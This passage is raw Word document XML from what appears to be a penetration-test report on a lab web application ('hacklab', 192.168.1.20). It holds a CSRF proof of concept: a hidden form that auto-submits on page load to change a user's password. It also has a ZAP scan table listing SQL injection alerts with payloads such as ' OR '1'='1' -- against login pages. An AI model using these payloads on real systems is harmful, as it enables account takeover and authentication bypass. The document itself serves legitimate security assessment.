        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    z = requests.post(url, data = myobj)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9F5EF8" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="400B1507" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    #print(z.text)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04328B95" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">    if z.text == y.text:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22218509" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AF95CB1" w14:textId="77777777" w:rsidR="001D0209" w:rsidRDefault="001D0209" w:rsidP="001D0209">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B65FBDE" w14:textId="77777777" w:rsidR="00930A27" w:rsidRDefault="00930A27" w:rsidP="00930A27">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="73" w:name="_Toc58836622"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">5.1 </w:t>
      </w:r>
      <w:r w:rsidR="00DA102C">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>Session Spoofing</w:t>
      </w:r>
      <w:bookmarkEnd w:id="73"/>
    </w:p>
    <w:p w14:paraId="227C605F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="00930A27" w:rsidP="004D38B2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="14D2C91E" wp14:editId="757A34AC">
            <wp:extent cx="5943600" cy="1172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2210"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1889E57F" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D35E976" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="74" w:name="_Toc58836623"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">5.2 </w:t>
      </w:r>
      <w:r w:rsidR="004D38B2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="74"/>
    </w:p>
    <w:p w14:paraId="184A5A24" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;form id="updateForm" name="updateForm" method="post" action="http://192.168.1.20/Changepassword.php?id=15" onsubmit="return updateValidate(this)" _lpchecked="1"&gt;&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7770DDBC" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FF75A27" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;input type="hidden" name="opassword" value="Boop"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F4A5087" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;input type="hidden" name="npassword" value="Beep"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31001406" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;input type="hidden" name="cpassword" value="Beep"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0D00DF" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;input type="submit" value="Change"/&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CE74AEB" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00320665" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>opassword=test&amp;npassword=hacklab&amp;cpassword=hacklab&amp;Submit=Change</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2C0F42" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="27522428" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>&lt;body onload="document.forms[0].submit()"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1541D7D3" w14:textId="77777777" w:rsidR="004D38B2" w:rsidRDefault="004D38B2" w:rsidP="004D38B2">
      <w:pPr>
        <w:pStyle w:val="code"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1A0175AC" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="75" w:name="_Toc58836624"/>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>7.1 Active Scan Results</w:t>
      </w:r>
      <w:bookmarkEnd w:id="75"/>
    </w:p>
    <w:p w14:paraId="450C0DEB" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
      <w:r>
        <w:t>Summary of Alerts</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="4907" w:type="pct"/>
        <w:tblCellSpacing w:w="15" w:type="dxa"/>
        <w:tblInd w:w="88" w:type="dxa"/>
        <w:tblCellMar>
          <w:top w:w="15" w:type="dxa"/>
          <w:left w:w="15" w:type="dxa"/>
          <w:bottom w:w="15" w:type="dxa"/>
          <w:right w:w="15" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1660"/>
        <w:gridCol w:w="513"/>
        <w:gridCol w:w="2112"/>
        <w:gridCol w:w="4901"/>
      </w:tblGrid>
      <w:tr w:rsidR="00DA102C" w14:paraId="2EA695DB" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:trHeight w:val="360"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="666666"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7A7EC051" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>Risk Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="666666"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6BA4DC5C" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>Number of Alerts</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w14:paraId="28155BA5" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="47CFC3B5" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00324BE7" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:hyperlink r:id="rId46" w:anchor="high" w:history="1">
              <w:r w:rsidR="00DA102C">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                </w:rPr>
                <w:t>High</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0893C5BB" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w14:paraId="77D4C649" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="56699212" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00324BE7" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:hyperlink r:id="rId47" w:anchor="medium" w:history="1">
              <w:r w:rsidR="00DA102C">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                </w:rPr>
                <w:t>Medium</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2B15A12B" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w14:paraId="4B911FE5" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="38C7CC4A" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00324BE7" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:hyperlink r:id="rId48" w:anchor="low" w:history="1">
              <w:r w:rsidR="00DA102C">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                </w:rPr>
                <w:t>Low</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="63F510C4" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w14:paraId="050F8EAA" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1981753A" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00324BE7" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:hyperlink r:id="rId49" w:anchor="info" w:history="1">
              <w:r w:rsidR="00DA102C">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
                  <w:sz w:val="20"/>
                  <w:szCs w:val="20"/>
                </w:rPr>
                <w:t>Informational</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="167AEE2A" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7EC5C96D" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="40E0B539" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r w:rsidRPr="00DA102C">
              <w:t>High (Medium)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07951EA8" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r w:rsidRPr="00DA102C">
              <w:t>SQL Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="08E8C3EC" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:gridAfter w:val="1"/>
          <w:wAfter w:w="2645" w:type="pct"/>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="885" w:type="pct"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04CD55DC" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r w:rsidRPr="00DA102C">
              <w:t>Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1406" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="546384C1" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
            </w:pPr>
            <w:r w:rsidRPr="00DA102C">
              <w:t>SQL injection may be possible.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7178B4E8" w14:textId="77777777" w:rsidTr="007577DE">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:gridSpan w:val="4"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="64B0E61C" w14:textId="77777777" w:rsidR="00DA102C" w:rsidRPr="00DA102C" w:rsidRDefault="00DA102C" w:rsidP="00DA102C">
            <w:pPr>
              <w:pStyle w:val="code"/>
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="7A5AEE52"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3EC1285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13352F0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4608B13A"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D75AF8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76DAE17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744D66E2"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5683E8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1D8E39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2C6B8A62"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5870E96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7EB623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hacklab@hacklab.com' AND '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6B6CA3A5"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34A891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41DD8CB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4834B52D"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1CED6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36FDF8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7C68CDA"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2917608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00DF0B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14F79F76"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67162D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58D8EC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adfIcIwP' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="59519F31"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7AAD3B3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URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3802" w:type="pct"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E8E8E8"/>
            <w:tcMar>
              <w:top w:w="45" w:type="dxa"/>
              <w:left w:w="60" w:type="dxa"/>
              <w:bottom w:w="45" w:type="dxa"/>
              <w:right w:w="60" w:type="dxa"/>
            </w:tcMar>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62C5CC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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="6C21188F"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2B54F14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74B8AF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102BFDEB"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CB809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4B5829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password</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="0433720A"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2B8CF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06F1C5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password' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="5C6D6BE8"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44AA914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5E9385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http://192.168.1.20/register-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="17F76E60"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6CD17F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3C049C9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37A45A46"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A520A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0868CD9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5992F3AA"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3727F44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12D391F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ZAP' AND '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00DA102C" w:rsidRPr="00DA102C" w14:paraId="76480827"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759A99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46F313B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http://192.168.1.20/admin/login-exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
